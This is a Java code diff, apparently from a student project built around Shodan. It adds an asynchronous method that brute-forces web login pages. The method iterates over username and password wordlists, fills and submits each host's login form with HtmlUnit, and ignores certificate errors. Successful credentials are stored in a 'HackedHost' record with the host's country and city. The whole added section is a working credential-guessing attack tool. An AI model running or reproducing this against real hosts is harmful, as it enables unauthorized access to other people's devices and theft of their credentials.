@@ -26,6 +26,13 @@ import org.springframework.scheduling.annotation.Async;
 import org.springframework.scheduling.annotation.AsyncResult;
 import org.springframework.stereotype.Service;
 
+import com.gargoylesoftware.htmlunit.FailingHttpStatusCodeException;
+import com.gargoylesoftware.htmlunit.WebClient;
+import com.gargoylesoftware.htmlunit.html.HtmlForm;
+import com.gargoylesoftware.htmlunit.html.HtmlPage;
+import com.gargoylesoftware.htmlunit.html.HtmlPasswordInput;
+import com.gargoylesoftware.htmlunit.html.HtmlSubmitInput;
+import com.gargoylesoftware.htmlunit.html.HtmlTextInput;
 import com.uah.shodan_tfg.core.services.IConnectionService;
 import com.uah.shodan_tfg.core.util.IFileService;
 import com.uah.shodan_tfg.dataproviders.dao.HackedHost;
@@ -93,6 +100,128 @@ public class ConnectionService implements IConnectionService {
 			LOGGER.error(e.getMessage(), e);
 		}
 		return body;
+	}
+
+	@Override
+	@Async
+	public Future<String> webAuthLogin(Host host, List<String> wordlists)
+			throws InterruptedException {
+		String result = "";
+		finalResult = "";
+		List<String> userWordlist = fileService
+				.fileToList("wordlists/" + wordlists.get(0));
+		List<String> passWordlist = fileService
+				.fileToList("wordlists/" + wordlists.get(1));
+		String ip = host.getIp();
+		Integer port = host.getPort();
+
+		if (running.compareAndSet(false, true)) {
+			for (String user : userWordlist) {
+				for (String pass : passWordlist) {
+					if (Thread.currentThread().isInterrupted()) {
+						System.out.println("Interrupted");
+						running.set(false);
+						return new AsyncResult<String>(finalResult);
+					}
+					// URL hostUrl;
+					// try {
+					// hostUrl = new URL("http://" + host.getIp() + ":"
+					// + host.getPort());
+					// URLConnection connection = hostUrl.openConnection();
+					//
+					// String userPass = user + ":" + pass;
+					// String authStr = Base64.getEncoder()
+					// .encodeToString(userPass.getBytes());
+					// // setting Authorization header
+					// connection.setRequestProperty("Authorization",
+					// "Basic " + authStr);
+					//
+					// Map<String, List<String>> headersMap = connection
+					// .getHeaderFields();
+					// System.out.println("-- Response headers --");
+					// headersMap.entrySet().forEach(e -> System.out
+					// .printf("%s: %s%n", e.getKey(), e.getValue()));
+					// System.out.println("-- Response body --");
+					// try (BufferedReader reader = new BufferedReader(
+					// new InputStreamReader(
+					// connection.getInputStream()))) {
+					// reader.lines().forEach(System.out::println);
+					// }
+					// } catch (MalformedURLException e) {
+					// LOGGER.error(e.getMessage(), e);
+					// } catch (IOException e) {
+					// LOGGER.error(e.getMessage(), e);
+					// }
+					System.out.println("Credentials tested --> User: " + user
+							+ " | Password: " + pass);
+					messageController.send("Credentials tested --> User: "
+							+ user + " | Password: " + pass);
+					try (final WebClient webClient = new WebClient()) {
+						String protocol = "http://";
+						if (host.getPort() == 443) {
+							protocol = "https://";
+						}
+						webClient.getOptions().setUseInsecureSSL(true);
+						final HtmlPage page = webClient.getPage(
+								protocol + host.getIp() + ":" + host.getPort());
+						// final HtmlPage page = webClient.getPage(
+						// "http://" + "192.168.1.1" + ":" + "80");
+
+						final HtmlForm form = page.getForms().get(0);
+
+						final HtmlSubmitInput button = (HtmlSubmitInput) form
+								.getByXPath("//*[contains(@type, 'submit')]")
+								.get(0);
+						final HtmlTextInput userField = (HtmlTextInput) form
+								.getByXPath(
+										"//input[contains(@name, 'user') or contains(@name, 'username')]")
+								.get(0);
+						final HtmlPasswordInput passField = (HtmlPasswordInput) form
+								.getByXPath(
+										"//input[contains(@type, 'password')]")
+								.get(0);
+						userField.type(user);
+						passField.type(pass);
+
+						// Now submit the form by clicking the button and get
+						// back the second page.
+						final HtmlPage page2 = button.click();
+						if (!page2.getUrl().equals(page.getUrl())) {
+							result = "Correct login credentials --> User: "
+									+ user + " | Password: " + pass;
+							System.out.println(result);
+							messageController.send(result);
+							finalResult = ip + "|" + user + "|" + pass + "|"
+									+ 22;
+							HackedHost hackedHost = hackedHostRepository
+									.findByIpAndPort(ip, host.getPort());
+							if (hackedHost == null) {
+								hackedHost = new HackedHost(null, ip, user,
+										pass, host.getPort(),
+										host.getLocation().getCountry(),
+										host.getLocation().getCity(),
+										finalResult);
+							} else {
+								hackedHost.setUser(user);
+								hackedHost.setPassword(pass);
+							}
+							hackedHostRepository.save(hackedHost);
+							running.set(false);
+							return new AsyncResult<String>(finalResult);
+						} else {
+							System.out.println("Incorrect login credentials");
+							messageController
+									.send("Incorrect login credentials");
+						}
+					} catch (FailingHttpStatusCodeException | IOException e) {
+						LOGGER.error(e.getMessage(), e);
+					}
+				}
+			}
+		}
+
+		return new AsyncResult<String>(finalResult);
+
 	}
 
 	private void testSecurity(Integer id, String ip, Integer port) {
